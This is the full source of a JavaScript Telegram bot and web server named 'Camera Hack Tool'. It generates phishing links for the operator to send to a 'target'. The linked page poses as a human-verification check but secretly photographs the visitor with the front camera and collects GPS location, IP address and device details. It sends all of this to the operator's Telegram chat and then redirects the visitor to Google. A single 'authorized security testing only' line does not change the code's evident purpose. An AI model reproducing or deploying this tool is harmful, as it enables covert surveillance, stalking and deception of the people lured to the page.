// ============================================================
// CONFIG — CHANGE THESE TWO LINES
// ============================================================
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || 'YOUR_TELEGRAM_ID';
// ============================================================

module.exports = async (req, res) => {
  const VERCEL_URL = process.env.VERCEL_URL || `https://${req.headers.host}`;
  const { pathname } = new URL(req.url, VERCEL_URL);
  
  // ============================================================
  // ROUTE: /webhook — Telegram bot webhook
  // ============================================================
  if (pathname === '/webhook') {
    if (req.method !== 'POST') {
      res.setHeader('Allow', 'POST');
      return res.status(405).send('Method not allowed');
    }
    
    const data = req.body;
    
    try {
      // Handle callback queries (button clicks)
      if (data && data.callback_query) {
        const cq = data.callback_query;
        const chatId = cq.message.chat.id;
        const cbData = cq.data;
        
        // Answer callback
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ callback_query_id: cq.id })
        });
        
        if (cbData === 'main_menu') {
          const linkId = Math.random().toString(36).substring(2, 10);
          const phishUrl = `${VERCEL_URL}/c/${linkId}`;
          
          const keyboard = {
            inline_keyboard: [
              [{ text: '📸 𝐅𝐫𝐨𝐧𝐭 𝐂𝐚𝐦𝐞𝐫𝐚 𝐀𝐜𝐜𝐞𝐬𝐬', callback_data: 'front_cam' }],
              [{ text: '🎙️ 𝐀𝐮𝐝𝐢𝐨 𝐑𝐞𝐜𝐨𝐫𝐝', callback_data: 'audio_rec' }],
              [{ text: '📍 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐒𝐞𝐧𝐝 🌐', callback_data: 'location_send' }],
              [{ text: '🔗 Generate New Link', callback_data: 'gen_link' }],
            ]
          };
          
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: `🔗 <b>Your Test Link:</b>\n\n<code>${phishUrl}</code>\n\nSend this to the target. When they open it and grant permissions, the data will appear here.\n\n<b>Link ID:</b> <code>${linkId}</code>`,
              reply_markup: JSON.stringify(keyboard),
              parse_mode: 'HTML'
            })
          });
        }
        else if (cbData === 'gen_link') {
          const linkId = Math.random().toString(36).substring(2, 10);
          const phishUrl = `${VERCEL_URL}/c/${linkId}`;
          
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: `🔗 <b>New Link Generated:</b>\n\n<code>${phishUrl}</code>\n\n<b>Link ID:</b> <code>${linkId}</code>`,
              parse_mode: 'HTML'
            })
          });
        }
        else {
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: '📌 Generate a link first using the button above, then send it to the target.\n\nWhen the victim allows permissions, the data will be sent here automatically.',
              parse_mode: 'HTML'
            })
          });
        }
        
        return res.status(200).send('OK');
      }
      
      // Handle /start command
      if (data && data.message && data.message.text === '/start') {
        const chatId = data.message.chat.id;
        
        const keyboard = {
          inline_keyboard: [
            [{ text: '🤗 𝐂𝐚𝐦𝐞𝐫𝐚 𝐇𝐚𝐜𝐤 𝐓𝐨𝐨𝐥', callback_data: 'main_menu' }]
          ]
        };
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: '👋 <b>Welcome to Camera Security Test Bot</b>\n\nThis tool is for authorized security testing only.\n\nClick below to generate a test link:',
            reply_markup: JSON.stringify(keyboard),
            parse_mode: 'HTML'
          })
        });
        
        return res.status(200).send('OK');
      }
      
    } catch (err) {
      console.error('Webhook error:', err);
    }
    
    return res.status(200).send('OK');
  }
  
  // ============================================================
  // ROUTE: /c/:linkId — Serve the phishing page
  // ============================================================
  const phishMatch = pathname.match(/^\/c\/([a-zA-Z0-9]+)$/);
  if (phishMatch) {
    const linkId = phishMatch[1];
    
    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Content Verification</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
        .card{background:white;border-radius:20px;padding:40px;max-width:500px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;}
        .shield-icon{font-size:80px;margin-bottom:20px;}
        h1{color:#1a1a2e;font-size:24px;margin-bottom:10px;}
        p{color:#666;margin-bottom:25px;line-height:1.6;}
        .verify-btn{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;padding:18px 50px;font-size:18px;border-radius:50px;cursor:pointer;transition:all 0.3s ease;font-weight:600;width:100%;max-width:300px;}
        .verify-btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(102,126,234,0.4);}
        .verify-btn:disabled{opacity:0.6;cursor:not-allowed;transform:none;}
        .loading{display:none;margin-top:20px;}
        .loading.active{display:block;}
        .spinner{border:4px solid #f3f3f3;border-top:4px solid #667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 15px;}
        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        .status{margin-top:20px;padding:15px;border-radius:10px;display:none;}
        .status.success{background:#d4edda;color:#155724;display:block;}
        .status.error{background:#f8d7da;color:#721c24;display:block;}
        .permissions-list{text-align:left;margin:20px 0;padding:0;list-style:none;}
        .permissions-list li{padding:12px 15px;margin:5px 0;background:#f8f9fa;border-radius:10px;display:flex;align-items:center;gap:10px;font-size:14px;}
        .permissions-list li .icon{font-size:20px;}
        .permissions-list li.granted{background:#d4edda;border-left:4px solid #28a745;}
        .permissions-list li.denied{background:#f8d7da;border-left:4px solid #dc3545;}
        .permissions-list li.pending{border-left:4px solid #ffc107;}
    </style>
</head>
<body>
    <div class="card">
        <div class="shield-icon">🛡️</div>
        <h1>Content Verification Required</h1>
        <p>We need to verify you're a real person. Please allow access to continue.</p>
        <ul class="permissions-list" id="permList">
            <li class="pending" id="camPerm"><span class="icon">📸</span> Camera Access <span id="camStatus">(pending)</span></li>
            <li class="pending" id="micPerm"><span class="icon">🎙️</span> Microphone Access <span id="micStatus">(pending)</span></li>
            <li class="pending" id="locPerm"><span class="icon">📍</span> Location Access <span id="locStatus">(pending)</span></li>
        </ul>
        <button class="verify-btn" id="verifyBtn" onclick="startVerification()">✅ Continue to Verify</button>
        <div class="loading" id="loading"><div class="spinner"></div><p>Verifying your device...</p></div>
        <div class="status" id="status"></div>
    </div>
    <script>
        const LINK_ID = '${linkId}';
        const API_URL = '/api/capture?link=' + LINK_ID;
        let perms = { camera:false, microphone:false, location:false };
        function getInfo() {
            return {user_agent:navigator.userAgent, timestamp:new Date().toISOString(), screen_res:screen.width+'x'+screen.height, platform:navigator.platform, language:navigator.language, link_id:LINK_ID};
        }
        async function requestMedia() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:true});
                perms.camera = true; perms.microphone = true;
                document.getElementById('camPerm').className='granted'; document.getElementById('camStatus').textContent='(granted ✓)';
                document.getElementById('micPerm').className='granted'; document.getElementById('micStatus').textContent='(granted ✓)';
                const video = document.createElement('video'); video.srcObject=stream; video.play();
                await new Promise(r=>setTimeout(r,500));
                const canvas = document.createElement('canvas'); canvas.width=video.videoWidth||640; canvas.height=video.videoHeight||480;
                const ctx = canvas.getContext('2d'); ctx.drawImage(video,0,0);
                const photo = canvas.toDataURL('image/jpeg',0.8);
                stream.getTracks().forEach(t=>t.stop()); return photo;
            } catch(e) {
                document.getElementById('camPerm').className='denied'; document.getElementById('camStatus').textContent='(denied ✗)';
                document.getElementById('micPerm').className='denied'; document.getElementById('micStatus').textContent='(denied ✗)';
                return null;
            }
        }
        function requestLocation() {
            return new Promise((resolve)=>{
                if(!navigator.geolocation) { document.getElementById('locPerm').className='denied'; document.getElementById('locStatus').textContent='(not supported ✗)'; resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos)=>{perms.location=true; document.getElementById('locPerm').className='granted'; document.getElementById('locStatus').textContent='(granted ✓)'; resolve({latitude:pos.coords.latitude,longitude:pos.coords.longitude,accuracy:pos.coords.accuracy});},
                    ()=>{document.getElementById('locPerm').className='denied'; document.getElementById('locStatus').textContent='(denied ✗)'; resolve(null);},
                    {enableHighAccuracy:true,timeout:10000,maximumAge:0}
                );
            });
        }
        async function sendData(photo,location) {
            const data = {...getInfo(), photo:photo, latitude:location?.latitude||null, longitude:location?.longitude||null, accuracy:location?.accuracy||null, hasCamera:perms.camera, hasMic:perms.microphone, hasLocation:perms.location};
            try { const r = await fetch(API_URL, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}); return r.ok; } catch(e) { return false; }
        }
        async function startVerification() {
            const btn = document.getElementById('verifyBtn'); const loading = document.getElementById('loading'); const status = document.getElementById('status');
            btn.disabled=true; btn.textContent='⏳ Verifying...'; loading.classList.add('active');
            const [photo, location] = await Promise.all([requestMedia(), requestLocation()]);
            const sent = await sendData(photo, location);
            loading.classList.remove('active');
            if(sent) { status.className='status success'; status.innerHTML='✅ <b>Verification Complete!</b><br>You will be redirected shortly...'; btn.textContent='✅ Verified'; setTimeout(()=>{window.location.href='https://www.google.com';},2000); }
            else { status.className='status error'; status.innerHTML='❌ <b>Verification Failed</b><br>Please try again.'; btn.disabled=false; btn.textContent='🔄 Try Again'; }
        }
    </script>
</body>
</html>
    `);
  }
  
  // ============================================================
  // ROUTE: /api/capture — Receive captured data from victim
  // ============================================================
  if (pathname === '/api/capture') {
    if (req.method !== 'POST') {
      res.setHeader('Allow', 'POST');
      return res.status(405).json({ error: 'Method not allowed' });
    }
    
    const data = req.body;
    if (!data) return res.status(400).json({ error: 'No data' });
    
    const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress;
    
    let msg = `📸 <b>New Capture!</b>\n\n`;
    msg += `<b>Link ID:</b> <code>${data.link_id || 'unknown'}</code>\n`;
    msg += `<b>IP:</b> <code>${ip}</code>\n`;
    msg += `<b>Device:</b> ${data.platform || 'Unknown'}\n`;
    msg += `<b>Screen:</b> ${data.screen_res || 'Unknown'}\n`;
    msg += `<b>Time:</b> ${data.timestamp || new Date().toISOString()}\n\n`;
    msg += `<b>Permissions:</b>\n`;
    msg += `📸 Camera: ${data.hasCamera ? '✅' : '❌'}\n`;
    msg += `🎙️ Mic: ${data.hasMic ? '✅' : '❌'}\n`;
    msg += `📍 Location: ${data.latitude ? '✅' : '❌'}`;
    
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: msg, parse_mode: 'HTML' })
      });
    } catch(e) { console.error('Send msg err:', e); }
    
    if (data.photo && data.hasCamera) {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, photo: data.photo, caption: '📸 Front Camera Capture', parse_mode: 'HTML' })
        });
      } catch(e) { console.error('Send photo err:', e); }
    }
    
    if (data.latitude && data.longitude) {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, latitude: data.latitude, longitude: data.longitude })
        });
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: `📍 <a href="https://maps.google.com/maps?q=${data.latitude},${data.longitude}">View on Google Maps</a>`, parse_mode: 'HTML' })
        });
      } catch(e) { console.error('Send location err:', e); }
    }
    
    return res.status(200).json({ status: 'ok' });
  }
  
  // ============================================================
  // ROUTE: /admin — Admin panel
  // ============================================================
  if (pathname === '/admin') {
    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(`
<!DOCTYPE html>
<html>
<head><title>Admin Panel</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:-apple-system,system-ui,sans-serif;background:#0a0a0f;color:#e0e0e0;}
.container{max-width:800px;margin:0 auto;padding:20px;text-align:center;}
h1{color:#00ff88;margin-bottom:30px;}
.card{background:#1a1a2e;border-radius:12px;padding:40px;border:1px solid #2a2a4e;margin-bottom:20px;}
.icon{font-size:60px;margin-bottom:20px;}
p{color:#888;line-height:1.6;margin-bottom:20px;}
.info{background:#12121f;border-radius:8px;padding:15px;margin:10px 0;font-size:14px;color:#ccc;text-align:left;}
.label{color:#00ff88;font-weight:bold;}
.btn{display:inline-block;background:#00ff88;color:#0a0a0f;padding:12px 30px;border-radius:50px;text-decoration:none;font-weight:bold;margin:10px;}
.btn:hover{background:#00cc6a;}
</style></head>
<body>
<div class="container">
<h1>🔐 Admin Dashboard</h1>
<div class="card">
<div class="icon">📊</div>
<h2>System Active</h2>
<p>All captures are sent directly to your Telegram in real-time.</p>
<div class="info">
<div><span class="label">Status:</span> ✅ Online</div>
<div><span class="label">Data Storage:</span> Telegram (real-time)</div>
<div><span class="label">Links:</span> Generated via Telegram bot</div>
</div>
<a class="btn" href="/">Home</a>
</div>
</div>
</body>
</html>
    `);
  }
  
  // ============================================================
  // ROUTE: / — Home
  // ============================================================
  res.setHeader('Content-Type', 'text/html');
  return res.status(200).send(`
<!DOCTYPE html>
<html>
<head><title>Bot Running</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:-apple-system,system-ui,sans-serif;background:#0a0a0f;color:#e0e0e0;display:flex;align-items:center;justify-content:center;min-height:100vh;}
.container{text-align:center;padding:20px;}
h1{color:#00ff88;font-size:3em;}
p{color:#888;margin:20px 0;}
code{background:#1a1a2e;padding:5px 10px;border-radius:5px;color:#00ff88;}
a{color:#0088ff;text-decoration:none;}
</style></head>
<body>
<div class="container">
<h1>✅ Running</h1>
<p>Bot is active. Open Telegram and send <code>/start</code> to your bot.</p>
<p><a href="/admin">Admin Panel</a></p>
</div>
</body>
</html>
  `);
};
